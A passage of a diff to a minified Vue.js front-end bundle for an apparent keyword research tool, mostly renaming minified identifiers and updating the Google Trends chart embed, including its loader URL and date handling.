-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", uB, [E(X, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", uL, [E(X, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
@@ -18465,7 +18484,7 @@ const gB = Ue({
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [6 == e.current_tab ? (b(), g("h4", dB, v(e.trans.get("Sorry, Google does not provide any prepositions for your query")), 1)) : 3 == e.current_tab ? (b(), g("h4", mB, v(e.trans.get("Sorry, Google does not provide any questions for your query")), 1)) : 2 == e.current_tab ? (b(), g("h4", hB, v(e.trans.get("Sorry, Google does not provide any related keywords for your query")), 1)) : (b(), g("h4", pB, v(e.trans.get("Sorry, Google does not provide any keyword suggestions for your query")), 1))])),
+                message: C((() => [6 == e.current_tab ? (b(), g("h4", dL, v(e.trans.get("Sorry, Google does not provide any prepositions for your query")), 1)) : 3 == e.current_tab ? (b(), g("h4", mL, v(e.trans.get("Sorry, Google does not provide any questions for your query")), 1)) : 2 == e.current_tab ? (b(), g("h4", hL, v(e.trans.get("Sorry, Google does not provide any related keywords for your query")), 1)) : (b(), g("h4", pL, v(e.trans.get("Sorry, Google does not provide any keyword suggestions for your query")), 1))])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Z, {
                 onMore: e.more,
@@ -18505,13 +18524,13 @@ const gB = Ue({
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    yB = {
+    yL = {
         class: "row g-0 me-lg-n1px"
     },
-    wB = {
+    wL = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const fB = Ue({
+const fL = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -18524,7 +18543,7 @@ const fB = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", yB, [S("div", wB, [E(i, {
+            return b(), g("div", yL, [S("div", wL, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -18549,17 +18568,17 @@ const fB = Ue({
             ])])])
         }]
     ]),
-    bB = {
+    bL = {
         class: "row g-0 me-lg-n1px"
     },
-    vB = {
+    vL = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    kB = {
+    kL = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const xB = Ue({
-        mixins: [DT],
+const xL = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/google/languages",
@@ -18577,7 +18596,7 @@ const xB = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", bB, [S("div", vB, [E(i, {
+            return b(), g("div", bL, [S("div", vL, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -18593,7 +18612,7 @@ const xB = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", kB, [E(i, {
+            ])]), S("div", kL, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -18606,65 +18625,65 @@ const xB = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    CB = ["value"],
-    SB = ["value"],
-    TB = ["value"],
-    FB = ["value"],
-    qB = {
+    CL = ["value"],
+    SL = ["value"],
+    TL = ["value"],
+    FL = ["value"],
+    qL = {
         key: 4,
         class: "row"
     },
-    EB = {
+    EL = {
         class: "col-12"
     },
-    UB = {
+    UL = {
         class: "check-search-volume-settings-locations mb-3"
     },
-    MB = {
+    ML = {
         key: 0,
         class: "form-label check-search-volume-settings-locations-label"
     },
-    AB = {
+    AL = {
         key: 1,
         class: "form-label check-search-volume-settings-locations-label"
     },
-    PB = {
+    PL = {
         key: 2,
         class: "check-search-volume-settings-locations-help form-text text-muted"
     },
-    LB = {
+    $L = {
         key: 5,
         class: "row"
     },
-    BB = {
+    LL = {
         class: "col-12"
     },
-    $B = {
+    DL = {
         class: "check-search-volume-settings-network mb-3"
     },
-    DB = {
+    jL = {
         class: "form-label check-search-volume-settings-network-label"
     },
-    OB = {
+    OL = {
         class: "form-check"
     },
-    jB = ["id", "value"],
-    VB = ["for"],
-    HB = {
+    WL = ["id", "value"],
+    VL = ["for"],
+    HL = {
         key: 6,
         class: "row"
     },
-    IB = {
+    IL = {
         class: "col-12"
     },
-    NB = {
+    NL = {
         class: "check-search-volume-settings-currency mb-3"
     },
-    RB = {
+    BL = {
         class: "form-label check-search-volume-settings-currency-label"
     };
-const KB = Ue({
-    mixins: [$T, IT],
+const RL = Ue({
+    mixins: [DT, IT],
     data: () => ({
         locations_settings: {},
         locations_limit: 10,
@@ -18734,22 +18753,22 @@ const KB = Ue({
             name: "metrics_location",
             type: "hidden",
             value: e.locations
-        }, null, 8, CB)) : T("", !0), e.permissions.show_search_location_settings && e.location_country_only ? (b(), g("input", {
+        }, null, 8, CL)) : T("", !0), e.permissions.show_search_location_settings && e.location_country_only ? (b(), g("input", {
             key: 1,
             name: "metrics_country",
             type: "hidden",
             value: e.country
-        }, null, 8, SB)) : T("", !0), e.permissions.show_search_network_settings ? (b(), g("input", {
+        }, null, 8, SL)) : T("", !0), e.permissions.show_search_network_settings ? (b(), g("input", {
             key: 2,
             name: "metrics_network",
             type: "hidden",
             value: e.network
-        }, null, 8, TB)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+        }, null, 8, TL)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
             key: 3,
             name: "metrics_currency",
             type: "hidden",
             value: e.currency
-        }, null, 8, FB)) : T("", !0), e.permissions.show_search_location_settings ? (b(), g("div", qB, [S("div", EB, [S("div", UB, [e.location_country_only ? (b(), g("label", MB, v(e.trans.get("Location")), 1)) : (b(), g("label", AB, v(e.trans.get("Locations")), 1)), E(i, {
+        }, null, 8, FL)) : T("", !0), e.permissions.show_search_location_settings ? (b(), g("div", qL, [S("div", EL, [S("div", UL, [e.location_country_only ? (b(), g("label", ML, v(e.trans.get("Location")), 1)) : (b(), g("label", AL, v(e.trans.get("Locations")), 1)), E(i, {
             multiple: a.locations_settings.multiple,
             settings: a.locations_settings,
             options: e.current_location_list,
@@ -18759,18 +18778,18 @@ const KB = Ue({
             "onUpdate:modelValue": t[1] || (t[1] = t => e.current_metrics_location = t),
             "model-value": e.current_metrics_location,
             placeholder: e.trans.get("Type a location")
-        }, null, 8, ["multiple", "settings", "options", "model-value", "placeholder"]), e.location_country_only ? T("", !0) : (b(), g("small", PB, v(e.trans.get("Enter one or up to 10 locations to target.")), 1))])])])) : T("", !0), e.current_network_list.length && e.permissions.show_search_network_settings ? (b(), g("div", LB, [S("div", BB, [S("div", $B, [S("label", DB, v(e.trans.get("Search Network")), 1), (b(!0), g(y, null, w(e.current_network_list, (r => (b(), g("div", OB, [F(S("input", {
+        }, null, 8, ["multiple", "settings", "options", "model-value", "placeholder"]), e.location_country_only ? T("", !0) : (b(), g("small", PL, v(e.trans.get("Enter one or up to 10 locations to target.")), 1))])])])) : T("", !0), e.current_network_list.length && e.permissions.show_search_network_settings ? (b(), g("div", $L, [S("div", LL, [S("div", DL, [S("label", jL, v(e.trans.get("Search Network")), 1), (b(!0), g(y, null, w(e.current_network_list, (r => (b(), g("div", OL, [F(S("input", {
             id: "google_network_" + r.id,
             class: "check-search-volume-settings-network-value form-check-input",
             type: "radio",
             "onUpdate:modelValue": t[2] || (t[2] = t => e.current_metrics_network = t),
             value: r.id
-        }, null, 8, jB), [
-            [j, e.current_metrics_network]
+        }, null, 8, WL), [
+            [W, e.current_metrics_network]
         ]), S("label", {
             for: "google_network_" + r.id,
             class: "check-search-volume-settings-network-label form-check-label"
-        }, v(r.text), 9, VB)])))), 256))])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", HB, [S("div", IB, [S("div", NB, [S("label", RB, v(e.trans.get("Currency")), 1), E(i, {
+        }, v(r.text), 9, VL)])))), 256))])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", HL, [S("div", IL, [S("div", NL, [S("label", BL, v(e.trans.get("Currency")), 1), E(i, {
             settings: e.currency_settings,
             options: e.current_currency_list,
             class: "check-search-volume-settings-currency-value",
@@ -18781,7 +18800,7 @@ const KB = Ue({
         }, null, 8, ["settings", "options", "model-value", "placeholder"])])])])) : T("", !0)])
     }]
 ]);
-const JB = Ue({
+const KL = Ue({
         mixins: [_p],
         components: {},
         props: ["preoptions"],
@@ -18811,13 +18830,13 @@ const JB = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])
         }]
     ]),
-    WB = {
+    JL = {
         class: "row g-0"
     },
-    zB = {
+    zL = {
         class: "col-12 my-1"
     };
-const YB = Ue({
+const YL = Ue({
         components: {},
         data: () => ({
             country: "",
@@ -18835,7 +18854,7 @@ const YB = Ue({
         },
         async created() {
             this.id = se(), this.search_type = window.param("search_type"), this.settings = {
-                containerCssClass: " country-dropdown form-control google-trends-country-select2 rounded-top-start-md-0 rounded-bottom-start-md-0 rounded-top-end-lg-0 rounded-bottom-end-lg-0 pe-3",
+                containerCssClass: " country-dropdown form-control google-trends-country-select2 rounded-top-start-lg-0 rounded-bottom-start-lg-0 rounded-top-end-lg-0 rounded-bottom-end-lg-0 pe-3",
                 create: !1,
                 allowEmptyOption: !1,
                 duplicates: !1,
@@ -18860,7 +18879,7 @@ const YB = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", WB, [S("div", zB, [E(i, {
+            return b(), g("div", JL, [S("div", zL, [E(i, {
                 disabled: a.loading,
                 id: "country_" + a.id,
                 options: a.options,
@@ -18872,11 +18891,11 @@ const YB = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    GB = {
+    GL = {
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         data: () => ({
             show_google_trends_chart: !0,
@@ -18904,7 +18923,7 @@ const YB = Ue({
                     var o = document.createElement("script");
                     o.async = !0, o.onload = () => {
                         e(!0)
-                    }, o.src = "https://ssl.gstatic.com/trends_nrtr/760_RC08/embed_loader.js", document.body.appendChild(o)
+                    }, o.src = "https://ssl.gstatic.com/trends_nrtr/3570_RC01/embed_loader.js", document.body.appendChild(o)
                 }))
             },
             async fetch() {
@@ -18931,130 +18950,133 @@ const YB = Ue({
             async applyTab(e) {
                 Ce("google-trends-category-rebuild", e), Ce("google-trends-country-rebuild", e), Ce("search-form-keyword-rebuild"), this.current_tab = e, this.keywords = [], this.summaries = {}, this.pie_summaries = {}, this.current_filter_keyword_result_period = this.default_keyword_result_period, this.filter(!0)
             },
-            embed(e, t) {
-                if ("undefined" != typeof trends) {
-                    var r = document.getElementById("chart_" + t);
-                    r && r.parentNode && "TR" == r.parentNode.nodeName && (r.parentNode.classList.contains("d-none") ? (r.parentNode.classList.remove("d-none"), r.parentNode.classList.add("embed"), trends.embed.renderExploreWidgetTo(r, "TIMESERIES", {
+            async embed(e, t) {
+                if ("undefined" == typeof trends && await this.initTrends(), "undefined" != typeof trends) {
+                    var r = this.geo,
+                        s = this.property,
+                        a = this.date ? this.date : "today 12-m",
+                        o = document.getElementById("chart_" + t);
+                    o && o.parentNode && "TR" == o.parentNode.nodeName && (o.parentNode.classList.contains("d-none") ? (o.parentNode.classList.remove("d-none"), o.parentNode.classList.add("embed"), trends.embed.renderExploreWidgetTo(o, "TIMESERIES", {
                         comparisonItem: [{
                             keyword: e,
-                            geo: this.geo,
-                            time: "today 12-m"
+                            geo: r,
+                            time: a
                         }],
                         category: 0,
-                        property: this.property
+                        property: s
                     }, {
-                        exploreQuery: "cat=0&geo=" + this.geo + "&gprop=" + this.property + "&q=" + encodeURIComponent(e) + "&date=today 12-m",
+                        exploreQuery: "cat=0&geo=" + r + "&gprop=" + s + "&q=" + encodeURIComponent(e) + "&date=" + encodeURIComponent(a),
                         guestPath: "https://trends.google.com:443/trends/embed/"
-                    }), "embedinit" != t && (this.has_embed = !0)) : (r.parentNode.classList.remove("embed"), r.parentNode.classList.add("d-none"), r.innerHTML = "", "embedinit" != t && document.querySelectorAll("tr.embed.iframe-google-trends-chart").length <= 0 && (this.has_embed = !1)))
+                    }), "embedinit" != t && (this.has_embed = !0)) : (o.parentNode.classList.remove("embed"), o.parentNode.classList.add("d-none"), o.innerHTML = "", "embedinit" != t && document.querySelectorAll("tr.embed.iframe-google-trends-chart").length <= 0 && (this.has_embed = !1)))
                 }
             }
         }
     },
-    XB = {
+    XL = {
         class: "search-results-settings my-2"
     },
-    QB = {
+    QL = {
         class: "search-results-settings-display mx-n1"
     },
-    ZB = {
+    ZL = {
         class: "row"
     },
-    e$ = {
+    eD = {
         class: "col"
     },
-    t$ = {
+    tD = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
-    r$ = {
+    rD = {
         class: "row"
     },
-    s$ = {
+    sD = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    a$ = {
+    aD = {
         key: 1,
         class: "col-12 col-md-6"
     },
-    o$ = {
+    oD = {
         class: "row"
     },
-    i$ = {
+    iD = {
         class: "col"
     },
-    n$ = {
+    nD = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    l$ = {
+    lD = {
         key: 1,
         class: "row"
     },
-    c$ = {
+    cD = {
         class: "col-12 col-md-6"
     },
-    _$ = {
+    _D = {
         class: "col-12 col-md-6"
     },
-    u$ = {
+    uD = {
         class: "row"
     },
-    d$ = {
+    dD = {
         class: "col-12"
     },
-    m$ = {
+    mD = {
         class: "row"
     },
-    h$ = {
+    hD = {
         class: "col-12"
     },
-    p$ = {
+    pD = {
         key: 2,
         class: "alert-pro-upsell alert-pro-upsell-above-summary mb-4 mt-2",
         role: "alert"
     },
-    g$ = {
+    gD = {
         class: "row"
     },
-    y$ = S("div", {
+    yD = S("div", {
         class: "col-lg-1 d-none d-lg-block"
     }, null, -1),
-    w$ = {
+    wD = {
         class: "col-sm-12 col-md-12 col-lg-10"
     },
-    f$ = {
+    fD = {
         class: "card text-center shadow"
     },
-    b$ = {
+    bD = {
         class: "card-body"
     },
-    v$ = S("h5", {
+    vD = S("h5", {
         class: "card-title"
     }, " 🚀 Keyword Tool Pro ", -1),
-    k$ = {
+    kD = {
         class: "card-text"
     },
-    x$ = ["innerHTML"],
-    C$ = ["href"],
-    S$ = S("i", {
+    xD = ["innerHTML"],
+    CD = ["href"],
+    SD = S("i", {
         class: "bi bi-box-arrow-in-right me-1"
     }, null, -1),
-    T$ = ["innerHTML"],
-    F$ = S("div", {
+    TD = ["innerHTML"],
+    FD = S("div", {
         class: "col-lg-1 d-none d-lg-block"
     }, null, -1),
-    q$ = {
+    qD = {
         class: "search-results-summary card my-4 bg-light"
     },
-    E$ = {
+    ED = {
         class: "card-body"
     },
-    U$ = {
+    UD = {
         class: "search-results-keywords my-3"
     },
-    M$ = {
+    MD = {
         class: "mb-4"
     };
-const A$ = Ue(GB, [
+const AD = Ue(GL, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("loading-section"),
                 n = k("current-filter-keyword-result-period"),
@@ -19073,19 +19095,19 @@ const A$ = Ue(GB, [
                 M = k("search-results-settings-modal-search-volume"),
                 A = k("search-results-settings-modal-search-volume-trend"),
                 P = k("search-results-settings-modal-average-cpc"),
-                L = k("search-results-settings-modal-bing-competition"),
-                $ = k("search-results-settings-modal-competition"),
-                D = k("search-results-settings-filter-positive-keywords"),
+                $ = k("search-results-settings-modal-bing-competition"),
+                D = k("search-results-settings-modal-competition"),
+                j = k("search-results-settings-filter-positive-keywords"),
                 O = k("search-results-settings-filter-negative-keywords"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -19098,7 +19120,7 @@ const A$ = Ue(GB, [
                 se = k("search-results-actions");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
-            }, null, 8, ["loading"]), S("div", XB, [S("div", QB, [E(n, {
+            }, null, 8, ["loading"]), S("div", XL, [S("div", QL, [E(n, {
                 onClearFilter: e.clearFilter,
                 current_permissions: e.current_permissions,
                 show_current_filter_keyword_result_period: e.show_current_filter_keyword_result_period,
@@ -19158,17 +19180,17 @@ const A$ = Ue(GB, [
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data ? (b(), g(y, {
                     key: 0
-                }, [S("div", ZB, [S("div", e$, [S("h5", t$, v(e.trans.get("Search Volume Settings")), 1)])]), S("div", r$, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", s$, [E(q, {
+                }, [S("div", ZL, [S("div", eD, [S("h5", tD, v(e.trans.get("Search Volume Settings")), 1)])]), S("div", rD, [e.current_metrics_is_estimated ? T("", !0) : (b(), g("div", sD, [E(q, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[0] || (t[0] = t => e.current_metrics_network = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", a$, [E(U, {
+                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])), e.current_permissions.show_currency_settings ? (b(), g("div", aD, [E(U, {
                     current_currency_list: e.current_currency_list,
                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[1] || (t[1] = t => e.current_metrics_currency = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)])], 64)) : T("", !0), S("div", o$, [S("div", i$, [S("h5", n$, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", l$, [S("div", c$, [E(M, {
+                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)])], 64)) : T("", !0), S("div", oD, [S("div", iD, [S("h5", nD, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", lD, [S("div", cD, [E(M, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -19184,7 +19206,7 @@ const A$ = Ue(GB, [
                     "onUpdate:current_filter_search_volume_trend_min": t[4] || (t[4] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[5] || (t[5] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", _$, [E(P, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", _D, [E(P, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -19192,12 +19214,12 @@ const A$ = Ue(GB, [
                     "onUpdate:current_filter_average_cpc_min": t[6] || (t[6] = t => e.current_filter_average_cpc_min = t),
                     current_filter_average_cpc_max: e.current_filter_average_cpc_max,
                     "onUpdate:current_filter_average_cpc_max": t[7] || (t[7] = t => e.current_filter_average_cpc_max = t)
-                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_dropdown_settings ? (b(), x(L, {
+                }, null, 8, ["current_permissions", "average_cpc_format", "error_fields", "current_filter_average_cpc_min", "current_filter_average_cpc_max"]), e.current_permissions.show_competition_dropdown_settings ? (b(), x($, {
                     key: 0,
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(D, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -19206,7 +19228,7 @@ const A$ = Ue(GB, [
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", u$, [S("div", d$, [E(D, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", uD, [S("div", dD, [E(j, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -19215,26 +19237,26 @@ const A$ = Ue(GB, [
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", m$, [S("div", h$, [E(O, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", mD, [S("div", hD, [E(O, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
                     current_negative_keywords: e.current_negative_keywords,
                     "onUpdate:current_negative_keywords": t[13] || (t[13] = t => e.current_negative_keywords = t)
-                }, null, 8, ["onCheckDuplicate", "current_remain_negative_keywords", "error_fields", "current_negative_keywords"])])]), e.user_is_paid || e.current_permissions.pro_is_paused ? T("", !0) : (b(), g("div", p$, [S("div", g$, [y$, S("div", w$, [S("div", f$, [S("div", b$, [v$, S("div", k$, [S("p", {
+                }, null, 8, ["onCheckDuplicate", "current_remain_negative_keywords", "error_fields", "current_negative_keywords"])])]), e.user_is_paid || e.current_permissions.pro_is_paused ? T("", !0) : (b(), g("div", pD, [S("div", gD, [yD, S("div", wD, [S("div", fD, [S("div", bD, [vD, S("div", kD, [S("p", {
                     innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                         count_free: 5
                     })
-                }, null, 8, x$)]), S("a", {
+                }, null, 8, xD)]), S("a", {
                     href: e.routes.page_pro_index,
                     target: "_blank",
                     rel: "noopener",
                     class: "btn btn-warning"
-                }, [S$, S("span", {
+                }, [SD, S("span", {
                     innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                         count_pro: "2,000"
                     })
-                }, null, 8, T$)], 8, C$)])])]), F$])])), E(j, {
+                }, null, 8, TD)], 8, CD)])])]), FD])])), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -19259,7 +19281,7 @@ const A$ = Ue(GB, [
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", q$, [S("div", E$, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", qD, [S("div", ED, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -19267,18 +19289,18 @@ const A$ = Ue(GB, [
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 8 != e.current_tab && 9 != e.current_tab ? T("", !0) : (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 8 != e.current_tab && 9 != e.current_tab ? T("", !0) : (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", U$, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", UD, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -19316,7 +19338,7 @@ const A$ = Ue(GB, [
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [S("h4", M$, v(e.trans.get("Sorry, Google Trends does not provide any keyword suggestions for your query")), 1)])),
+                message: C((() => [S("h4", MD, v(e.trans.get("Sorry, Google Trends does not provide any keyword suggestions for your query")), 1)])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Y, {
                 onMore: e.more,
@@ -19356,7 +19378,7 @@ const A$ = Ue(GB, [
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    P$ = {
+    PD = {
         components: {
             "pie-chart": hp
         },
@@ -19445,234 +19467,234 @@ const A$ = Ue(GB, [
             }
         }
     },
-    L$ = {
+    $D = {
         class: "row g-0"
     },
-    B$ = {
+    LD = {
         class: "col-xl-11 col-lg-11 col-12"
     },
-    $$ = {
+    DD = {
         class: "row row-cols-md-3 row-cols-lg-3 row-cols-xl-3"
     },
-    D$ = {
+    jD = {
         class: "col my-1"
     },
-    O$ = {
+    OD = {
         key: 0,
         class: "search-results-summary-unique-keywords-label"
     },
-    j$ = {
+    WD = {
         key: 1,
         class: "search-results-summary-unique-keywords-label"
     },
-    V$ = {
+    VD = {
         key: 2,
         class: "search-results-summary-unique-keywords-label"
     },
-    H$ = {
-        class: "search-results-summary-unique-keywords-value h3"
-    },
-    I$ = {
-        key: 0
-    },
-    N$ = {
-        key: 1
-    },
-    R$ = {
-        key: 0,
-        class: "col my-1"
-    },
-    K$ = {
-        key: 0
-    },
-    J$ = {
-        class: "search-results-summary-total-post-label"
-    },
-    W$ = {
-        key: 0,
-        class: "search-results-summary-total-posts-value h3"
-    },
-    z$ = {
-        key: 0
-    },
-    Y$ = {
-        key: 1
-    },
-    G$ = {
-        key: 1,
-        class: "search-results-summary-posts-value text-blur h3"
-    },
-    X$ = {
-        class: "col my-1"
-    },
-    Q$ = {
-        key: 0
-    },
-    Z$ = {
-        class: "search-results-summary-total-search-volume-label"
-    },
-    eD = ["data-bs-content"],
-    tD = {
-        key: 0,
-        class: "search-results-summary-total-search-volume-value h3"
-    },
-    rD = {
-        key: 0
-    },
-    sD = {
-        key: 1,
-        class: "text-muted"
-    },
-    aD = ["data-bs-content"],
-    oD = {
-        key: 1,
-        class: "search-results-summary-search-volume-value text-blur h3"
-    },
-    iD = {
-        class: "col my-1"
-    },
-    nD = {
-        key: 0
-    },
-    lD = {
-        class: "search-results-summary-average-trend-label"
-    },
-    cD = ["data-bs-content"],
-    _D = {
-        key: 0,
-        class: "search-results-summary-average-trend-value h3"
-    },
-    uD = {
-        key: 0
-    },
-    dD = {
-        key: 0,
-        class: "text-success"
-    },
-    mD = S("i", {
-        class: "bi bi-arrow-up"
-    }, null, -1),
-    hD = {
-        key: 1,
-        class: "text-danger"
-    },
-    pD = S("i", {
-        class: "bi bi-arrow-down"
-    }, null, -1),
-    gD = {
-        key: 2
-    },
-    yD = {
-        key: 0
-    },
-    wD = {
-        key: 1,
-        class: "text-muted"
-    },
-    fD = ["data-bs-content"],
-    bD = {
-        key: 1,
-        class: "search-results-summary-average-trend-value text-blur h3"
-    },
-    vD = {
-        key: 1,
-        class: "col my-1"
-    },
-    kD = {
-        key: 0
-    },
-    xD = {
-        class: "search-results-summary-average-cpc-label"
-    },
-    CD = ["data-bs-content"],
-    SD = {
-        key: 0,
-        class: "search-results-summary-average-cpc-value h3"
-    },
-    TD = {
-        key: 0
-    },
-    FD = {
-        key: 1,
-        class: "text-muted"
-    },
-    qD = ["data-bs-content"],
-    ED = {
-        key: 1,
-        class: "search-results-summary-average-cpc-value text-blur h3"
